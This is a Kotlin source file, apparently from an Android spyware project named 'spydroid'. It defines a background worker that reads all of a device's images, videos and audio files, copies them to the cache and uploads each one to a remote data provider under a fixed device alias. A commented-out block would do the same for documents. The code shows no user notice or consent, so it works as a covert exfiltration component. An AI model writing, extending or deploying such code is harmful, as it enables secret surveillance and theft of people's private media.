/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package net.spydroid.feature.sharedata

import android.content.Context
import android.net.Uri
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import net.spydroid.common.local.LocalDataProvider
import net.spydroid.common.remote.RemoteDataProvider
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream

class ShareDataWork(private val appContext: Context, workerParams: WorkerParameters) :
    Worker(appContext, workerParams) {

    private val localDataProvider = LocalDataProvider.current(appContext)
    private val remoteDataProvider = RemoteDataProvider.current(appContext)
    private val scope = CoroutineScope(Dispatchers.IO)
    private fun getFileFromUri(uri: Uri, ext: String): File {
        val inputStream: InputStream? = appContext.contentResolver.openInputStream(uri)
        val file = File(appContext.cacheDir, "tempFile_${System.currentTimeMillis()}.$ext")

        val outputStream = FileOutputStream(file)
        val buffer = ByteArray(1024)
        var length: Int

        while (inputStream?.read(buffer).also { length = it!! } != -1) {
            outputStream.write(buffer, 0, length)
        }

        outputStream.flush()
        outputStream.close()
        inputStream?.close()

        return file
    }

    override fun doWork(): Result {
        try {
            scope.launch {

                localDataProvider.currentMutimedia.collect {

                    if (!it.images.isNullOrEmpty()) {
                        it.images!!.map { uri ->
                            scope.launch(Dispatchers.IO) {
                                remoteDataProvider.setFile(
                                    getFileFromUri(uri, ext = "jpg"),
                                    type = "IMAGE",
                                    alias = "PRUEBA_A03s"
                                )
                            }
                        }
                    }

                    if (!it.videos.isNullOrEmpty()) {
                        it.videos!!.map { uri ->
                            scope.launch(Dispatchers.IO) {
                                remoteDataProvider.setFile(
                                    getFileFromUri(uri, ext = "mp4"),
                                    type = "VIDEO",
                                    alias = "PRUEBA_A03s"
                                )
                            }
                        }
                    }

                    if (!it.audios.isNullOrEmpty()) {
                        it.audios!!.map { uri ->
                            scope.launch(Dispatchers.IO) {
                                remoteDataProvider.setFile(
                                    getFileFromUri(uri, ext = "mp3"),
                                    type = "AUDIO",
                                    alias = "PRUEBA_A03s"
                                )
                            }
                        }
                    }

                    /*

                   if (!it.documents.isNullOrEmpty()) {
                        it.documents!!.map { uri ->
                            remoteDataProvider.setFile(
                                getFileFromUri(uri),
                                type = "DOCUMENT",
                                alias = "PRUEBA_A03s"
                            )
                        }
                    }
                     */

                }
            }

            return Result.success()
        } catch (e: Exception) {
            return Result.failure()
        }
    }
}